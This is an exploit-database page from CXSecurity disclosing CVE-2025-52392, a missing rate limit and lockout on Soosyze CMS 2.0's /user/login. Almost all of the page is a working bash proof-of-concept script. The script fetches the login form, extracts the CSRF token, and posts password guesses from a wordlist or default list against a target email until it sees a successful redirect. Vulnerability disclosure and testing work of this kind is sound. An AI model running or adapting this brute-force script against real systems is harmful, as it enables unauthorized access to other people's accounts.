---
title: Soosyze CMS 2.0 Brute Force Login
url: https://cxsecurity.com/issue/WLB-2025120016
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-17
fetch_date: 2025-12-18T03:19:29.721291
---

# Soosyze CMS 2.0 Brute Force Login

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Soosyze CMS 2.0 Brute Force Login** **2025.12.17**  Credit:  **[Beatriz Fresno Naumova](https://cxsecurity.com/author/Beatriz%2BFresno%2BNaumova/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-52392](https://cxsecurity.com/cveshow/CVE-2025-52392/ "Click to see CVE-2025-52392")**  CWE: **[CWE-307](https://cxsecurity.com/cwe/CWE-307 "Click to see CWE-307")** | |

# Exploit Title: Soosyze CMS 2.0 - Brute Force Login
# Google Dork: N/A
# Date: 2025-08-13
# Exploit Author: Beatriz Fresno Naumova (beafn28)
# Vendor Homepage: https://soosyze.com/
# Software Link: https://github.com/soosyze/soosyze
# Version: 2.0 (tested)
# Tested on: macOS Sonoma 14.x (Apple Silicon M1), /bin/bash 3.2 & Homebrew bash 5.2, curl 8.x, BSD sed
# CVE : CVE-2025-52392
# Description:
# Soosyze CMS 2.0 allows brute-force login attacks via /user/login due to missing rate limiting
# and account lockout mechanisms. An attacker can submit unlimited POST requests with a known
# username/email and a password wordlist, potentially gaining unauthorized access (CWE-307).
# PoC Usage:
# ./script.sh [wordlist.txt]
# If no wordlist is provided, a dictionary is used.
#!/usr/bin/env bash
set -euo pipefail
BASE\_URL="http://localhost:8000"
LOGIN\_PATH="/user/login"
EMAIL\_FIELD="email"
PASS\_FIELD="password"
TARGET\_EMAIL="test@test.com"
WORDLIST\_FILE="${1:-}"
DEFAULT\_WORDS=("123456" "admin" "password" "qwerty" "letmein" "admin123" "password1")
form\_url="$BASE\_URL$LOGIN\_PATH"
COOKIE\_JAR="$(mktemp)"
get\_form() {
curl -sS -c "$COOKIE\_JAR" -b "$COOKIE\_JAR" "$form\_url" > /tmp/login\_page.html
}
extract\_token() {
local name value
name=$(sed -nE 's/.\*name="([\_a-zA-Z0-9:-]\*(token|csrf)[\_a-zA-Z0-9:-]\*)".\*type="hidden".\*/\1/p' /tmp/login\_page.html | head -n1 || true)
value=""
if [[ -n "$name" ]]; then
value=$(sed -nE "s/.\*name=\"$name\".\*value=\"([^\"]\*)\".\*/\1/p" /tmp/login\_page.html | head -n1 || true)
fi
printf '%s\t%s\n' "$name" "$value"
}
post\_login() {
local pass="$1" tname="$2" tval="$3"
curl -sS -o /tmp/resp.html -w "%{http\_code}" \
-c "$COOKIE\_JAR" -b "$COOKIE\_JAR" \
-X POST "$form\_url" \
-H "Content-Type: application/x-www-form-urlencoded" \
-H "Origin: $BASE\_URL" -H "Referer: $form\_url" \
--data-urlencode "$EMAIL\_FIELD=$TARGET\_EMAIL" \
--data-urlencode "$PASS\_FIELD=$pass" \
$( [[ -n "$tname" && -n "$tval" ]] && printf -- '--data-urlencode %s=%s' "$tname" "$tval" )
}
echo "[\*] Starting brute-force attack on $form\_url"
[[ -n "$WORDLIST\_FILE" && -r "$WORDLIST\_FILE" ]] && mapfile -t words < "$WORDLIST\_FILE" || words=("${DEFAULT\_WORDS[@]}")
i=0
for pw in "${words[@]}"; do
i=$((i+1))
get\_form
IFS=$'\t' read -r TOKEN\_NAME TOKEN\_VALUE < <(extract\_token)
code=$(post\_login "$pw" "$TOKEN\_NAME" "$TOKEN\_VALUE")
if grep -q '"redirect"' /tmp/resp.html; then
echo -e "[$i] Password found: '\e[1m$pw\e[0m' (HTTP $code)"
break
else
echo "[$i] '$pw' (HTTP $code)"
fi
sleep 0.$((RANDOM%9+1))
done
rm -f "$COOKIE\_JAR" /tmp/resp.html

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025120016)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top